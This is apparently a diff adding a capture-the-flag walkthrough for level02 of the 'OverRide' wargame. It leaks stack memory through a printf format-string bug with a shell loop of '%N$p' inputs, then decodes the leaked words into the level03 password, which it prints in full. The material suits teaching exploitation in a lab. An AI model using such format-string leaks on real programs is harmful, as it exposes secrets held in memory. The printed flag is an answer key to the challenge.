@@ -1,0 +1,48 @@
+# in main function, we read the file .pass of level03 and we store it in a
+# buffer on the stack
+# we have a printf call at the end of the main
+# so we can use it and manipulate the format string to read on the stack.
+# the format %p : expects the argument to be of type (void *) and prints out the address
+# let's use it to read the flag stored on the stack.
+
+
+level02@OverRide:~$ for(( i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 | grep does; done
+1 - 0x7fffffffe4c0 does not have access!
+2 - (nil) does not have access!
+3 - (nil) does not have access!
+4 - 0x2a2a2a2a2a2a2a2a does not have access!
+5 - 0x2a2a2a2a2a2a2a2a does not have access!
+6 - 0x7fffffffe6b8 does not have access!
+7 - 0x1f7ff9a08 does not have access!
+8 - (nil) does not have access!
+9 - (nil) does not have access!
+10 - (nil) does not have access!
+11 - (nil) does not have access!
+12 - (nil) does not have access!
+13 - (nil) does not have access!
+14 - (nil) does not have access!
+15 - (nil) does not have access!
+16 - (nil) does not have access!
+17 - (nil) does not have access!
+18 - (nil) does not have access!
+19 - (nil) does not have access!
+20 - 0x100000000 does not have access!
+21 - (nil) does not have access!
+22 - 0x756e505234376848 does not have access!	|
+23 - 0x45414a3561733951 does not have access!	|
+24 - 0x377a7143574e6758 does not have access!	|	=> to put in big endian and
+   convert it to characters
+25 - 0x354a35686e475873 does not have access!	|
+26 - 0x48336750664b394d does not have access!	|
+27 - (nil) does not have access!
+28 - 0x383225202d203832 does not have access!
+29 - 0x7024 does not have access!
+
+# we convert
+python -c 'print "756e505234376848".decode("hex")[::-1]' => Hh74RPnu
+python -c 'print "45414a3561733951".decode("hex")[::-1]' => Q9sa5JAE
+python -c 'print "377a7143574e6758".decode("hex")[::-1]' => XgNWCqz7
+python -c 'print "354a35686e475873".decode("hex")[::-1]' => sXGnh5J5
+python -c 'print "48336750664b394d".decode("hex")[::-1]' => M9KfPg3H
+
+flag = Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
